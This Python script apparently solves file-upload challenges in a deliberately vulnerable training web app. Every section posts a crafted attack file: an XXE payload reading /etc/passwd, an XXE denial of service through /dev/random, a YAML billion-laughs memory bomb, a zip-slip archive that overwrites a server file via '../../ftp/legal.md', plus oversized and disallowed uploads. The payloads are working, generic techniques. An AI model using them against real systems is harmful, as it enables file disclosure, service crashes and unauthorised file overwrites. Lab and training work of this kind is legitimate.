"""Batch 4: file upload, XXE, YAML bomb, zip-slip file write."""
import harness, io, zipfile
from harness import Session, log_attempt, solved_set
s = Session()
def solved(k): return k in solved_set(s)
def post_file(name, content, mime="application/octet-stream"):
    if isinstance(content,str): content=content.encode()
    return s.post("/file-upload", auth=False, files={"file":(name,content,mime)})
def L(key,name,approach,r):
    ok=solved(key); return log_attempt(key,name,approach,"success" if ok else "failed",ok,f"{r.status_code} {r.text[:90]}")

# Upload Size (>100KB pdf, allowed type so only size triggers)
r=post_file("big.pdf", b"%PDF-1.4\n"+b"A"*150000, "application/pdf")
L("uploadSizeChallenge","Upload Size","POST /file-upload a 150KB .pdf (>100000 byte limit not enforced)",r)

# Upload Type (disallowed extension)
r=post_file("evil.exe", b"MZ malicious", "application/x-msdownload")
L("uploadTypeChallenge","Upload Type","POST /file-upload a .exe (only pdf/xml/zip/yml allowed)",r)

# Deprecated Interface + XXE file disclosure (.xml reading /etc/passwd)
xxe='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<foo>&xxe;</foo>'
r=post_file("xxe.xml", xxe, "application/xml")
L("deprecatedInterfaceChallenge","Deprecated Interface","POST /file-upload an .xml (deprecated B2B interface still active)",r)
L("xxeFileDisclosureChallenge","XXE Data Access","XXE external entity file:///etc/passwd in uploaded XML",r)

# XXE DoS (hang reading /dev/random -> 2s vm timeout)
dos='<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]>\n<foo>&xxe;</foo>'
r=post_file("dos.xml", dos, "application/xml")
L("xxeDosChallenge","XXE DoS","XXE entity file:///dev/random hangs parser past 2s timeout",r)

# YAML bomb (billion laughs -> Invalid string length)
lines=["a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]"]
prev='a'
for ch in "bcdefghi":
    refs=",".join([f"*{prev}"]*9)
    lines.append(f"{ch}: &{ch} [{refs}]")
    prev=ch
ybomb="\n".join(lines)+"\n"
r=post_file("bomb.yml", ybomb, "text/yaml")
L("yamlBombChallenge","Memory Bomb","YAML billion-laughs anchors (9^9 expansion) crashes parser",r)

# Arbitrary File Write (zip slip -> overwrite ftp/legal.md)
buf=io.BytesIO()
with zipfile.ZipFile(buf,"w") as z:
    z.writestr("../../ftp/legal.md","PWNED via zip slip\n")
r=post_file("slip.zip", buf.getvalue(), "application/zip")
L("fileWriteChallenge","Arbitrary File Write","Zip-slip: entry '../../ftp/legal.md' escapes uploads/complaints/ to overwrite ftp/legal.md",r)
